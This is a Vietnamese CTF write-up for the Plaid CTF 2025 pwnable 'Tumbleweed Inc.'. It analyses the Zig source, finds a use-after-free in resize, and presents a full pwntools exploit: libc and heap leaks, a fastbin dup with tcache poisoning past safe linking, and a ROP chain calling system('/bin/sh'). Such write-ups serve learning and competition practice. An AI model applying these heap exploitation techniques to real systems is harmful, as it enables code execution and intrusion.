---
title:  "Plaid CTF 2025 - Tumbleweed Inc."
date:   2025-04-10 10:00:00 +0700
header:
  teaser: "/assets/images/2025-04-10-plaid2025-tumbleweed/Screenshot 2025-04-10 183726.png"
categories: 
  - competitions
tags:
  - elf
  - heap
  - double-free
  - Plaid CTF
---

Tuần vừa rồi mình có tham gia giải Plaid CTF 2025 và kết quả không được tốt lắm khi mình không giải được challenge pwnable nào trong thời gian thi. Kết thúc giải mình có làm lại tumbleweed, sau đây sẽ là writeup của mình cho bài này.

![Challenge description](/assets/images/2025-04-10-plaid2025-tumbleweed/Screenshot%202025-04-10%20183726.png){:class="img-responsive"}

## Phân tích
### Tổng quan
Challenge cho ta một elf binary được viết bằng zig, source code cùng với libc phiên bản 2.35. Canary và PIE tắt.

![Checksec](/assets/images/2025-04-10-plaid2025-tumbleweed/Screenshot%202025-04-11%20065808.png){:class="img-responsive"}

Chương trình mô phỏng một thí nghiệm nuôi cấy cỏ lăn (tumbleweed) với một vài chức năng chính:

```rust
const std = @import("std");

const stdout = std.io.getStdOut().writer();
const stdin = std.io.getStdIn();
const reader = stdin.reader();

var fba_buf: [128]u8 = undefined;
var fba: std.heap.FixedBufferAllocator = undefined;

var tumbleweed_incubators: [16]?[]u8 = undefined;
var heaps: [4]std.mem.Allocator = undefined;
var burn_count = [4]u8{ 0, 0, 0, 0 };

const technical_difficulty = error.FileNotFound;

fn printOptions() !void {
    try stdout.print("\nOptions\n", .{});
    try stdout.print("[0] Grow a tumbleweed\n", .{});
    try stdout.print("[1] Set a tumbleweed on fire\n", .{});
    try stdout.print("[2] Inspect a tumbleweed\n", .{});
    try stdout.print("[3] Trim or feed a tumbleweed\n", .{});
    try stdout.print("[4] Give up\n", .{});
    try stdout.print("> ", .{});
}
```

0, Grow: Alloc 1 chunk với incubator (index), size, allocator và data được chỉ định bởi user.

```rust
fn grow() !void {
    var idx: usize = undefined;
    var size: usize = undefined;

    try stdout.print("Which incubator? ", .{});
    idx = readNonNegativeInt(tumbleweed_incubators.len) catch {
        try stdout.print("Invalid index!\n", .{});
        return technical_difficulty;
    };

    try stdout.print("Size? ", .{});
    size = readNonNegativeInt(0) catch {
        try stdout.print("Invalid size!\n", .{});
        return technical_difficulty;
    };

    const heap_idx = chooseHeap() catch {
        try stdout.print("Invalid heap choice!\n", .{});
        return technical_difficulty;
    };
    tumbleweed_incubators[idx] = try heaps[heap_idx].alloc(u8, size);

    try stdout.print("Label: ", .{});
    _ = try reader.readUntilDelimiterOrEof(tumbleweed_incubators[idx].?, '\n');
}
```

1, Burn: Free một chunk với index và allocator được chỉ định. Có set null sau khi free.

```rust
fn burn() !void {
    var idx: usize = undefined;

    try stdout.print("Which incubator? ", .{});
    idx = readNonNegativeInt(tumbleweed_incubators.len) catch {
        try stdout.print("Invalid index!\n", .{});
        return technical_difficulty;
    };

    const heap_idx = chooseHeap() catch {
        try stdout.print("Invalid heap choice!\n", .{});
        return technical_difficulty;
    };

    if (burn_count[heap_idx] < 2) {
        burn_count[heap_idx] += 1;
        heaps[heap_idx].free(tumbleweed_incubators[idx].?);
        tumbleweed_incubators[idx] = null;
    }
}
```

2, Inspect: In ra data của chunk với index tương ứng.

```rust
fn inspect() !void {
    var idx: usize = undefined;

    try stdout.print("Which incubator? ", .{});
    idx = readNonNegativeInt(tumbleweed_incubators.len) catch {
        try stdout.print("Invalid index!\n", .{});
        return technical_difficulty;
    };

    try stdout.print("{s}\n", .{tumbleweed_incubators[idx].?});
}
```

3, Resize: Thay đổi size của một chunk với index, target size, allocator được chỉ định. Có thông báo cho biết có resize thành công hay không. Tuy nhiên khi debug mình thấy tác động của chức năng này là không rõ ràng lắm.

```rust
fn resize() !void {
    var idx: usize = undefined;
    var new_size: usize = undefined;

    try stdout.print("Which incubator? ", .{});
    idx = readNonNegativeInt(tumbleweed_incubators.len) catch {
        try stdout.print("Invalid index!\n", .{});
        return technical_difficulty;
    };

    try stdout.print("Target size: ", .{});
    new_size = readNonNegativeInt(0) catch {
        try stdout.print("Invalid size!\n", .{});
        return technical_difficulty;
    };

    const heap_idx = chooseHeap() catch {
        try stdout.print("Invalid heap choice!\n", .{});
        return technical_difficulty;
    };

    if (heaps[heap_idx].resize(tumbleweed_incubators[idx].?, new_size)) {
        try stdout.print("Resize success!\n", .{});
    } else {
        try stdout.print("Resize failed!\n", .{});
    }
}
```

4, Give up: thoát chương trình (có return).

### Một vài nhận xét
+ Ở chức năng resize không kiểm tra trường hợp khi `new_size` = 0, tương ứng với free, lúc này con trỏ chunk vẫn được lưu trong mảng `tumbleweed_incubators` nên ta có lỗi use-after-free.
+ Các allocator được sử dụng là C, Page, SMP và Fixed Buffer. Để cho đơn giản và quen thuộc thì chúng ta sẽ chỉ sử dụng duy nhất C allocator, như vậy các hành vi của heap sẽ dễ dự đoán hơn.

## Khai thác
Dựa vào những nhận xét trên, quy trình khai thác bài này sẽ như sau:  
1, Tạo các wrapper cần thiết cho tương tác

```python
#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./tumbleweed_patched", checksec = False)
libc = ELF("./libc.so.6", checksec = False)

# con = process()
con = remote("tumbleweed.chal.pwni.ng", 1337)

def debug_from_here():
    gdb.attach(con, gdb_args=['-ex', 'init-gef'], gdbscript = '''
        b*0x10037f8
        b*0x100417f
    ''')
    input()

def alloc0(idx, size, payload):
    con.sendlineafter(b'[4] Give up\n> ', b'0')
    con.sendlineafter(b'Which incubator? ', str(idx).encode())
    con.sendlineafter(b'Size? ', str(size).encode())
    con.sendlineafter(b'[3] Fixed Buffer\n> ', b'0')
    con.sendlineafter(b'Label: ', payload)

def inspect2(idx):
    con.sendlineafter(b'[4] Give up\n> ', b'2')
    con.sendlineafter(b'Which incubator? ', str(idx).encode())

def resize3(idx, size):
    con.sendlineafter(b'[4] Give up\n> ', b'3')
    con.sendlineafter(b'Which incubator? ', str(idx).encode())
    con.sendlineafter(b'Target size: ', str(size).encode())
    con.sendlineafter(b'[3] Fixed Buffer\n> ', b'0')
```

2, Leak libc bằng unsorted bin

```python
### stage 1: leak libc
alloc0(0, 1040, b'')
alloc0(1, 16, b'') # prevent consolidation
resize3(0, 0)
inspect2(0)
leak = u64(con.recv(8))
libc.address = leak - (libc.sym['main_arena']+96)
log.success('Libc base: ' + hex(libc.address))
```

3, Leak địa chỉ heap để bypass cơ chế safe linking, sau đó sử dụng double free dể leak địa chỉ stack bằng những thao tác sau:
+ Lấp đầy tcache và thực hiện fastbin dup
+ Lấy hết các chunk ra khỏi tcache
+ Ghi đè fd bằng địa chỉ bất kỳ (lưu ý align), lúc này heap sẽ đưa các chunk trong fastbin vào tcache, ta sẽ có quyền đọc/ghi tuỳ ý
+ Địa chỉ để leak stack là libc environ hoặc một địa chỉ cố định chứa stack address (trong script của mình là 0x1008470)

```python
### stage 2: get arby read/write
## stage 2.1: fill tcache and add a chunk to fastbin
for i in range(2,9):
    alloc0(i, 16, b'')
alloc0(9, 16, b'')
alloc0(10, 16, b'')

for i in range(2,9):
    resize3(i, 0)

## side quest: leak heap base
inspect2(2)
heap_base = u64(con.recv(8)) << 12
log.success('Heap base: ' + hex(heap_base))

resize3(9, 0)
resize3(10, 0)
resize3(9, 0)

## stage 2.2: pop a chunk from tcache and push a chunk from fastbin into it -> tcache poisoning
for i in range(2,9):
    alloc0(i, 16, b'')

alloc0(9, 16, p64(0x1008470 ^ (heap_base + 0x380) >> 12)) # bypass safe linking
alloc0(10, 16, b'')
alloc0(9, 16, b'')
alloc0(9, 16, b'')
inspect2(9)
stack = u64(con.recv(8))

log.success('Stack leak: ' + hex(stack))
```

4, Trong quá trình debug thấy địa chỉ stack leak được cao hơn địa chỉ chứa return addr trong 1 khoảng ngẫu nhiên nhất định (0x92, 0xa2,..., 0x122). Vẫn sử dụng các thao tác ghi tuỳ ý trên, ghi đè return address của main, trigger lỗi để chương trình return và lấy shell (tỉ lệ ra shell là khoảng 1/10)

```python
### stage 3: overwrite ret addr
POP_RDI = 0x000000000002a3e5
RET = 0x0000000001002801

for i in range(2,9):
    alloc0(i, 40, b'')
alloc0(9, 40, b'')
alloc0(10, 40, b'')

for i in range(2,9):
    resize3(i, 0)
resize3(9, 0)
resize3(10, 0)
resize3(9, 0)

for i in range(2,9):
    alloc0(i, 40, b'')

saved_rip = stack - (randint(0x9,0x12)*0x10 + 2)
alloc0(9, 40, p64(saved_rip - 8 ^ (heap_base + 0x580) >> 12))
alloc0(10, 40, b'')
alloc0(9, 40, b'')
log.success('Try saved rip: ' + hex(saved_rip))
alloc0(9, 40, p64(1) + p64(RET) + p64(libc.address + POP_RDI) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym['system']))

con.interactive()
```

![Solved](/assets/images/2025-04-10-plaid2025-tumbleweed/Screenshot%202025-04-10%20010345.png){:class="img-responsive"}
